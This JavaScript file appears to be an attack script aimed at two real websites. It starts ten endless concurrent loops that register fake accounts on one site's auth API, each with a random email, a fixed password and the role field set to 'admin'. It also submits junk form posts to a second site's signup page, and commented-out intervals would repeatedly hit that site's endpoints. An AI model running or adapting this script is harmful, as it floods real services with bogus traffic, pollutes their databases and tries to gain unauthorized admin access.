const fn = async (url) => {
    await fetch(url)
        .then(response => response.text())
        .then(data => {
            // Do something with the data
            console.log(count);
            console.log(JSON.stringify(data).split("0")[0]);
        })
        .catch(error => {
            // Handle any errors
            console.error("error");
        });
}

let count = 0;

const file = require('./file.json');
const fnBody = () => {
    // setInterval(() => {
    fetch("https://www.sirhome.com.ar/registrate.php", {
        "headers": {
            "content-type": "application/x-www-form-urlencoded",
            "sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "upgrade-insecure-requests": "1"
        },
        "referrer": "https://www.sirhome.com.ar/registrate.php",
        "referrerPolicy": "strict-origin-when-cross-origin",
        "body": `apynom=${file}&mail=hvbhfghfghfgh%40com&telefono=fghfghfghfgh&horario=fghfghfgh&formulario=Directo`,
        "method": "POST",
        "mode": "cors",
        "credentials": "omit"
    })
        .then(response => response.text())
        .then(data => {
            // Do something with the data
            console.log(count);
            console.log(JSON.stringify(data).split("0")[0]);
        })
        .catch(error => {
            // Handle any errors
            console.error(error);
        });
    //  }, 0);
}

const generateRandomName = () => {
    const characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let randomName = '';
    for (let i = 0; i < 8; i++) {
        randomName += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return randomName;
};

const main = async () => {
    for (let i = 0; i < Infinity; i++) {
        const body = {
            name: "jhonson",
            email: `${generateRandomName()}${parseInt(Math.random() * 10000000)}@gmail.com`,
            password: "1234Qwer*!",
            avtColor: "bg-blue-400",
            role: "admin"
        };
        count++
        console.log(count);
        await fetch("https://esencia-api.onrender.com/api/auth/register", {
            "headers": {
                "accept": "application/json, text/plain, */*",
                "accept-language": "en",
                "content-type": "application/json",
                "priority": "u=1, i",
                "sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": "\"Windows\"",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "cross-site"
            },
            "referrer": "https://www.esencia.app/",
            "referrerPolicy": "strict-origin-when-cross-origin", "body": JSON.stringify(body),
            "method": "POST",
            "mode": "cors",
            "credentials": "omit"
        })
            .then(response => response.text())
            .then(data => {
                // Do something with the data
                console.log(data);
            })
            .catch(error => {
                // Handle any errors
                console.error(error);
            });
    }
}

main();
main();
main();
main();
main();
main();
main();
main();
main();
main();

// setInterval(() => {

//     fetch("https://www.sirhome.com.ar/articulos/0451101.jpg")
//         .then(response => response.text())
//         .then(data => {
//             // Do something with the data
//             console.log(count);
//             console.log(JSON.stringify(data).split("0")[0]);
//         })
//         .catch(error => {
//             // Handle any errors
//             console.error("error");
//         });

// });